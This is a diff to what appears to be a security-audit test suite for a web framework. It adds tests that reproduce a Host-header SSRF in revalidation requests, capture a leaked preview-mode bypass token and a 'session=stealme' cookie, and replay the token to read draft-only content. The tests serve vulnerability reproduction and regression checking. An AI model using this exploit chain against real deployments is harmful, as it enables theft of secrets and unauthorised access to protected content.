@@ -18,6 +18,16 @@ type CapturedRscRequest = {
   headers: Record<string, string>
 }
 
+type RevalidateHostHeaderRepro = {
+  statusCode: number
+  body: string
+  captured: {
+    method: string
+    url: string
+    headers: http.IncomingHttpHeaders
+  }
+}
+
 describe('audit-middleware-bypass', () => {
   const auditSecret = `audit-secret-${Date.now()}`
   const { next, isNextStart } = nextTestSetup({
@@ -334,35 +344,7 @@ describe('audit-middleware-bypass', () => {
   })
 
   it('forwards revalidation requests to the untrusted Host header in trustHostHeader fallback mode', async () => {
-    const repro = await new Promise<{
-      statusCode: number
-      body: string
-      captured: {
-        method: string
-        url: string
-        headers: http.IncomingHttpHeaders
-      }
-    }>((resolve, reject) => {
-      execFile(
-        'node',
-        [join(__dirname, 'revalidate-host-header-ssrf-repro.js')],
-        {
-          cwd: process.cwd(),
-          env: {
-            ...process.env,
-            NODE_TLS_REJECT_UNAUTHORIZED: '0',
-          },
-        },
-        (error, stdout, stderr) => {
-          if (error) {
-            reject(new Error(stderr || error.message))
-            return
-          }
-
-          resolve(JSON.parse(stdout))
-        }
-      )
-    })
+    const repro = await runRevalidateHostHeaderRepro('preview-token')
 
     expect(repro.statusCode).toBe(200)
     expect(repro.captured.method).toBe('HEAD')
@@ -372,6 +354,37 @@ describe('audit-middleware-bypass', () => {
     )
     expect(repro.captured.headers.cookie).toBe('session=stealme')
   })
+
+  if (isNextStart) {
+    it('leaks a draft-mode bypass token through the revalidate host-header sink', async () => {
+      const withoutCookie = await next.fetch('/draft-only')
+      const withoutCookieText = await withoutCookie.text()
+
+      expect(withoutCookie.status).toBe(200)
+      expect(withoutCookieText).toContain('draft mode disabled')
+      expect(withoutCookieText).not.toContain('DRAFT SECRET PAYLOAD')
+
+      const prerenderManifest = await next.readJSON(
+        '.next/prerender-manifest.json'
+      )
+      const previewModeId = prerenderManifest.preview.previewModeId as string
+
+      const repro = await runRevalidateHostHeaderRepro(previewModeId)
+      const leakedToken = repro.captured.headers['x-prerender-revalidate']
+
+      expect(leakedToken).toBe(previewModeId)
+
+      const withCookie = await next.fetch('/draft-only', {
+        headers: {
+          cookie: `__prerender_bypass=${leakedToken}`,
+        },
+      })
+      const withCookieText = await withCookie.text()
+
+      expect(withCookie.status).toBe(200)
+      expect(withCookieText).toContain('DRAFT SECRET PAYLOAD')
+    })
+  }
 
   async function captureActionRequest(
     buttonId: 'trigger-action' | 'trigger-redirect-action' = 'trigger-action'
@@ -474,6 +487,33 @@ describe('audit-middleware-bypass', () => {
     })
 
     return captured!
+  }
+
+  async function runRevalidateHostHeaderRepro(
+    previewModeId = 'preview-token'
+  ): Promise<RevalidateHostHeaderRepro> {
+    return await new Promise<RevalidateHostHeaderRepro>((resolve, reject) => {
+      execFile(
+        'node',
+        [join(__dirname, 'revalidate-host-header-ssrf-repro.js')],
+        {
+          cwd: process.cwd(),
+          env: {
+            ...process.env,
+            AUDIT_PREVIEW_MODE_ID: previewModeId,
+            NODE_TLS_REJECT_UNAUTHORIZED: '0',
+          },
+        },
+        (error, stdout, stderr) => {
+          if (error) {
+            reject(new Error(stderr || error.message))
+            return
+          }
+
+          resolve(JSON.parse(stdout))
+        }
+      )
+    })
   }
 
   async function issueRequestWithHostHeader({
